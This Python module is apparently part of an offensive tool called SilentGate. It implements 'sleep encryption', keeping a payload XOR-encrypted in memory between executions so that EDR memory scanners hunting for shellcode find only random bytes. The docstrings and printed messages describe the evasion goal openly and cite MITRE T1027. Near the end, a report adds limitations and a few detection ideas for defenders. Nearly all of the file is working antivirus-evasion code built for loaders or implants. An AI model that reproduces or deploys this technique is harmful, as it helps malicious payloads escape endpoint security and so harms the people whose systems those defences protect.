"""
SilentGate - core/sleep_encrypt.py
v2.0 Feature: Sleep Encryption

Author  : JarDani
License : MIT
Purpose : Encrypts payload in memory between operations using
          XOR encryption with a randomly generated key.
          EDR memory scanners see only encrypted garbage.
          Payload only exists in plaintext during execution.

How it works:
  1. Generate a random XOR key
  2. Encrypt payload bytes with XOR
  3. Sleep for defined interval (payload is encrypted)
  4. Decrypt payload bytes with XOR (same key)
  5. Execute payload
  6. Re-encrypt immediately after execution

MITRE ATT&CK: T1027 - Obfuscated Files or Information
"""

import os
import time
import struct
import random
import hashlib


def generate_key(length=32):
    """
    Generate a cryptographically random XOR key.
    Uses os.urandom for true randomness — not predictable.
    Length of 32 bytes gives 256-bit key space.
    """
    return os.urandom(length)


def xor_encrypt(payload, key):
    """
    XOR encrypt payload bytes with key.
    Key is cycled if shorter than payload.

    XOR properties:
      plaintext XOR key = ciphertext
      ciphertext XOR key = plaintext
      Same operation encrypts and decrypts.
    """
    key_len    = len(key)
    encrypted  = bytearray(len(payload))

    for i, byte in enumerate(payload):
        encrypted[i] = byte ^ key[i % key_len]

    return bytes(encrypted)


def xor_decrypt(ciphertext, key):
    """
    XOR decrypt — identical to encrypt due to XOR properties.
    Separate function for clarity and documentation.
    """
    return xor_encrypt(ciphertext, key)


def compute_hash(data):
    """
    SHA256 hash of data for integrity verification.
    We verify decrypted payload matches original before execution.
    """
    return hashlib.sha256(data).hexdigest()


def encrypt_payload(payload, explain=False):
    """
    Encrypt a payload and return encrypted blob + metadata.

    Returns dict with:
      encrypted    : encrypted payload bytes
      key          : XOR key used
      original_hash: SHA256 of original for verification
      size         : payload size in bytes
    """
    if isinstance(payload, str):
        payload = payload.encode()

    payload = bytes(payload)

    if explain:
        print(f"\n  [SLEEP ENCRYPT] Encrypting payload...")
        print(f"  [SLEEP ENCRYPT] Payload size    : {len(payload)} bytes")
        print(f"  [SLEEP ENCRYPT] First 8 bytes   : "              + " ".join(f"{b:02X}" for b in payload[:8]))

    # Generate random key
    key           = generate_key(32)
    original_hash = compute_hash(payload)

    if explain:
        print(f"  [SLEEP ENCRYPT] XOR key (32 bytes): "              + key[:8].hex() + "...")

    # Encrypt
    encrypted = xor_encrypt(payload, key)

    if explain:
        print(f"  [SLEEP ENCRYPT] Encrypted size  : {len(encrypted)} bytes")
        print(f"  [SLEEP ENCRYPT] First 8 bytes   : "              + " ".join(f"{b:02X}" for b in encrypted[:8]))
        print(f"  [SLEEP ENCRYPT] Original hash   : {original_hash[:16]}...")
        print(f"  [SLEEP ENCRYPT] Payload is now encrypted garbage in memory")
        print(f"  [SLEEP ENCRYPT] EDR memory scanner will find no signature")

    return {
        "encrypted":     encrypted,
        "key":           key,
        "original_hash": original_hash,
        "size":          len(payload)
    }


def sleep_encrypted(encrypted_blob, sleep_seconds=5, explain=False):
    """
    Sleep while payload is encrypted in memory.
    During this time EDR scanners see only garbage.
    """
    if explain:
        print(f"\n  [SLEEP ENCRYPT] Entering encrypted sleep...")
        print(f"  [SLEEP ENCRYPT] Duration        : {sleep_seconds} seconds")
        print(f"  [SLEEP ENCRYPT] Payload state   : ENCRYPTED")
        print(f"  [SLEEP ENCRYPT] EDR sees        : random garbage bytes")
        print(f"  [SLEEP ENCRYPT] Sleeping...")

    time.sleep(sleep_seconds)

    if explain:
        print(f"  [SLEEP ENCRYPT] Awake after {sleep_seconds}s")


def decrypt_and_verify(encrypted_blob, explain=False):
    """
    Decrypt payload and verify integrity before execution.
    If hash does not match — abort. Payload may be corrupted
    or tampered with by EDR.
    """
    encrypted     = encrypted_blob["encrypted"]
    key           = encrypted_blob["key"]
    original_hash = encrypted_blob["original_hash"]

    if explain:
        print(f"\n  [SLEEP ENCRYPT] Decrypting payload for execution...")
        print(f"  [SLEEP ENCRYPT] Encrypted size  : {len(encrypted)} bytes")

    # Decrypt
    decrypted = xor_decrypt(encrypted, key)

    # Verify integrity
    decrypted_hash = compute_hash(decrypted)

    if explain:
        print(f"  [SLEEP ENCRYPT] Decrypted size  : {len(decrypted)} bytes")
        print(f"  [SLEEP ENCRYPT] Original hash   : {original_hash[:16]}...")
        print(f"  [SLEEP ENCRYPT] Decrypted hash  : {decrypted_hash[:16]}...")

    if decrypted_hash != original_hash:
        print(f"  [SLEEP ENCRYPT] ERROR: Hash mismatch — payload corrupted")
        print(f"  [SLEEP ENCRYPT] Aborting execution for safety")
        return None

    if explain:
        print(f"  [SLEEP ENCRYPT] Hash verified   : MATCH")
        print(f"  [SLEEP ENCRYPT] First 8 bytes   : "              + " ".join(f"{b:02X}" for b in decrypted[:8]))
        print(f"  [SLEEP ENCRYPT] Payload ready for execution")

    return decrypted


def re_encrypt(decrypted_payload, explain=False):
    """
    Re-encrypt immediately after execution.
    Payload spends minimum time in plaintext.
    """
    if explain:
        print(f"\n  [SLEEP ENCRYPT] Re-encrypting payload after execution...")

    return encrypt_payload(decrypted_payload, explain=False)


def print_sleep_encrypt_report(encrypted_blob, sleep_seconds):
    """Print a formatted sleep encryption report."""
    print(f"""
  ╔══════════════════════════════════════════════════════════════╗
  ║  SLEEP ENCRYPTION REPORT                                     ║
  ╚══════════════════════════════════════════════════════════════╝

  Payload size     : {encrypted_blob['size']} bytes
  Key size         : {len(encrypted_blob['key'])} bytes (256-bit)
  Algorithm        : XOR with random key
  Sleep duration   : {sleep_seconds} seconds
  Original hash    : {encrypted_blob['original_hash'][:32]}...
  MITRE            : T1027 - Obfuscated Files or Information

  What this defeats:
  EDR memory scanners run periodically looking for shellcode.
  During sleep the payload exists only as encrypted bytes.
  No signature matches encrypted garbage.
  Payload decrypts only at the moment of execution.

  What this does NOT defeat:
  A scanner that runs at the exact moment of decryption.
  Kernel callbacks that fire on execution regardless.
  Behavioural analysis of the execution pattern itself.

  Defender perspective:
  Monitor for periodic encrypt/decrypt/sleep patterns.
  Alert on memory regions that change entropy rapidly.
  Use hardware breakpoints on VirtualProtect calls.
  Correlate sleep durations with known C2 beacon intervals.

  Next upgrade — AES-256 encryption in v3.0
  replaces XOR for stronger cryptographic properties.
""")